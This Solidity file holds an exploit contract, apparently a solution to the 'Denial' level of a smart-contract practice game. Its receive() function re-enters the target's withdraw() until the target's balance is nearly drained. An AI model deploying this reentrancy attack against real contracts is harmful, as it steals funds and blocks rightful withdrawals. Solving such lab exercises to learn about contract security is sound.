// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view returns (uint);
}

contract DenialExploit{
    uint originContractBalanceOnePercent;
    uint neededBalance;
    address targetAddress = address(0x03DEE364d53b3a417D72B004d74345bbf08d8521);
    Denial targetContract = Denial(targetAddress);

    constructor() {
        originContractBalanceOnePercent = targetContract.contractBalance() / 100;
        neededBalance = targetContract.contractBalance() - originContractBalanceOnePercent;
    }

    function setTargetAddress(address _address) public{
        targetAddress = _address;
        targetContract = Denial(_address);

        originContractBalanceOnePercent = targetContract.contractBalance() / 100;
        neededBalance = targetContract.contractBalance() - originContractBalanceOnePercent;
    }

    receive() external payable {
        if( address(this).balance <= neededBalance){
            targetAddress.call(abi.encodeWithSignature("withdraw()"));
        }
    }
}